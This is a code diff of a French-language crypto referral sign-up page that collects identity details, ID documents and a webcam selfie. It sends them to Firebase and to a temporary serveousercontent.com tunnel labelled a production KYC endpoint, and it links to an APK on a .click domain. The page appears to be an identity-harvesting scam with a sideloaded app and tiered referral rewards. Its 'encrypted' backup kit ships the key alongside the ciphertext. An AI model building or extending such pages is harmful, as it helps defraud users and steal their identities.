@@ -289,6 +289,7 @@
         <main>
             <form id="registration-form" onsubmit="event.preventDefault();">
                 
+                <!-- STEP 1 -->
                 <div class="step-section active" id="step-1">
                     <h2 class="section-title"><i class="fas fa-id-card"></i> Identité Civile</h2>
                     
@@ -351,6 +352,7 @@
                     </div>
                 </div>
 
+                <!-- STEP 2 -->
                 <div class="step-section" id="step-2">
                     <h2 class="section-title"><i class="fas fa-shield-halved"></i> Coordonnées & Sécurité</h2>
 
@@ -399,6 +401,7 @@
                     </div>
                 </div>
 
+                <!-- STEP 3 -->
                 <div class="step-section" id="step-3">
                     <h2 class="section-title"><i class="fas fa-file-contract"></i> Pièces Justificatives</h2>
                     
@@ -450,6 +453,7 @@
                     </div>
                 </div>
 
+                <!-- STEP 4 -->
                 <div class="step-section" id="step-4">
                     <h2 class="section-title"><i class="fas fa-face-viewfinder"></i> Biométrie & Consentement</h2>
 
@@ -496,12 +500,14 @@
         </main>
     </div>
 
+    <!-- LOADER OVERLAY -->
     <div id="loader-overlay">
         <div class="spinner"></div>
         <div class="loader-text" id="loader-msg">TRAITEMENT EN COURS...</div>
         <div class="loader-subtext" id="loader-submsg"></div>
     </div>
 
+    <!-- SUCCESS MODAL -->
     <div id="modalSuccess" class="modal">
         <div class="success-icon-container">
             <i class="fas fa-check-circle" style="font-size: 4rem; color: var(--success);"></i>
@@ -516,7 +522,7 @@
         </div>
 
         <div>
-            <button class="btn-backup" onclick="downloadEncryptedKeycard()"><i class="fas fa-download-cloud"></i> Télécharger le Kit Secours Chiffré</button>
+            <button class="btn-backup" onclick="downloadEncryptedKeycard()"><i class="fas fa-cloud-download"></i> Télécharger le Kit Secours Chiffré</button>
         </div>
 
         <a href="https://agi-nexus-core.click/agi-business.pro.apk" style="text-decoration:none; width:100%; display: flex; justify-content: center;">
@@ -526,11 +532,46 @@
         </a>
     </div>
 
+    <!-- TOAST NOTIFICATION -->
     <div id="toastNotification" class="toast">
         <i id="toastIcon" class="fas fa-circle-info"></i>
         <span id="toastMessage">Notification</span>
     </div>
 
+    <!-- CRYPTOGRAPHIC CLASS DEFINITION -->
+    <script>
+        class NexusCrypto {
+            static async generateKey() {
+                return await window.crypto.subtle.generateKey(
+                    { name: "AES-GCM", length: 256 },
+                    true,
+                    ["encrypt", "decrypt"]
+                );
+            }
+
+            static async encrypt(text, key) {
+                const encoder = new TextEncoder();
+                const data = encoder.encode(text);
+                const iv = window.crypto.getRandomValues(new Uint8Array(12));
+                
+                const cipherBuffer = await window.crypto.subtle.encrypt(
+                    { name: "AES-GCM", iv: iv },
+                    key,
+                    data
+                );
+                
+                const cipherBytes = new Uint8Array(cipherBuffer);
+                const combinedResult = new Uint8Array(iv.length + cipherBytes.length);
+                combinedResult.set(iv, 0);
+                combinedResult.set(cipherBytes, iv.length);
+                
+                return btoa(String.fromCharCode(...combinedResult));
+            }
+        }
+        window.NexusCrypto = NexusCrypto;
+    </script>
+
+    <!-- MODULE DE GESTION APPLICATIVE -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
         import { getDatabase, ref, set, get, runTransaction, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
@@ -539,9 +580,8 @@
         //  CONFIGURATION DE CONFORMITÉ INDUSTRIELLE
         // ==========================================
         const KYC_CONFIG = {
-    mode: "PRODUCTION", 
-    complianceApiUrl: "https://9b07e57b9082fad3-154-66-165-10.serveousercontent.com/api/kyc/verify", 
-Point d'entrée sécurisé Serveo
+            mode: "PRODUCTION", 
+            complianceApiUrl: "https://9b07e57b9082fad3-154-66-165-10.serveousercontent.com/api/kyc/verify", 
             firebase: {
                 databaseURL: "https://atlasgroupebusiness-default-rtdb.firebaseio.com"
             }
@@ -551,17 +591,17 @@ Point d'entrée sécurisé Serveo
         const app = initializeApp({ databaseURL: KYC_CONFIG.firebase.databaseURL });
         const db = getDatabase(app);
 
-        // Réglages parrainage hérités (Utilisation explicite de AG-COIN)
+        // Réglages parrainage AG-COIN
         const BASE_REWARD = 500;
         const GRADES = [
             { min: 0, bonus: 0 }, { min: 6, bonus: 15 }, { min: 16, bonus: 35 },
             { min: 36, bonus: 60 }, { min: 76, bonus: 75 }, { min: 151, bonus: 100 }, { min: 301, bonus: 110 }
         ];
 
-        // Stockage d'activation cryptographique locale
+        // Stockage local temporaire pour activation
         let activeCredentials = null;
 
-        // Algorithme Base58
+        // Algorithme de dérivation Base58 pour ID décentralisé unique
         const generateB58 = (email) => {
             const alphabet = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
             let hash = 0;
@@ -589,7 +629,7 @@ Point d'entrée sécurisé Serveo
         let videoStream = null;
         let selfieBlob = null; 
 
-        // --- EXPOSITION DES FONCTIONS GLOBALES DEPUIS LE MODULE ---
+        // --- EXPOSITION DES FONCTIONS ET INTERFACES UTILES ---
         window.initReferral = function() {
             const refID = new URLSearchParams(window.location.search).get('ref');
             if (refID) {
@@ -801,9 +841,10 @@ Point d'entrée sécurisé Serveo
 
                 await set(ref(db, `accounts/${safeEmail}`), userData);
 
+                // Initialisation balance utilisateur en AG-COIN
                 await set(ref(db, `users/${b58_id}`), {
                     email: email,
-                    balance: 1000, // Récompense explicite en AG-COIN
+                    balance: 1000, 
                     referrals_count: 0,
                     status: 'active',
                     joined: serverTimestamp()
@@ -830,7 +871,7 @@ Point d'entrée sécurisé Serveo
                             return userData;
                         });
                     } catch (txErr) {
-                        console.error("Erreur transaction ambassadeur:", txErr);
+                        console.error("Erreur de parrainage :", txErr);
                     }
                 }
 
@@ -937,7 +978,7 @@ Point d'entrée sécurisé Serveo
             }
         };
 
-        // --- PROTOCOLE DE SECURITÉ AES-GCM-256 (TÉLÉCHARGEMENT KIT SECOURS) ---
+        // --- PROTOCOLE DE SÉCURITÉ AES-GCM-256 (TÉLÉCHARGEMENT KIT SECOURS) ---
         window.downloadEncryptedKeycard = async function() {
             if (!activeCredentials) {
                 showToast("Données d'activation introuvables.", "fas fa-shield-halved");
@@ -945,7 +986,8 @@ Point d'entrée sécurisé Serveo
             }
 
             try {
-                const key = await NexusCrypto.generateKey();
+                // Utilisation de la classe globale sécurisée
+                const key = await window.NexusCrypto.generateKey();
                 const textToEncrypt = JSON.stringify({
                     id: activeCredentials.userB58,
                     email: activeCredentials.email,
@@ -953,7 +995,7 @@ Point d'entrée sécurisé Serveo
                     timestamp: new Date().toISOString()
                 });
 
-                const encryptedPayload = await NexusCrypto.encrypt(textToEncrypt, key);
+                const encryptedPayload = await window.NexusCrypto.encrypt(textToEncrypt, key);
                 const exportedRawKey = await window.crypto.subtle.exportKey("jwk", key);
 
                 const backupData = JSON.stringify({
@@ -980,36 +1022,7 @@ Point d'entrée sécurisé Serveo
             }
         };
 
-        class NexusCrypto {
-            static async generateKey() {
-                return await window.crypto.subtle.generateKey(
-                    { name: "AES-GCM", length: 256 },
-                    true,
-                    ["encrypt", "decrypt"]
-                );
-            }
-
-            static async encrypt(text, key) {
-                const encoder = new TextEncoder();
-                const data = encoder.encode(text);
-                const iv = window.crypto.getRandomValues(new Uint8Array(12));
-                
-                const cipherBuffer = await window.crypto.subtle.encrypt(
-                    { name: "AES-GCM", iv: iv },
-                    key,
-                    data
-                );
-                
-                const cipherBytes = new Uint8Array(cipherBuffer);
-                const combinedResult = new Uint8Array(iv.length + cipherBytes.length);
-                combinedResult.set(iv, 0);
-                combinedResult.set(cipherBytes, iv.length);
-                
-                return btoa(String.fromCharCode(...combinedResult));
-            }
-        }
-
-        // Démarrage global
+        // Démarrage initial global
         window.initReferral();
     </script>
 </body>
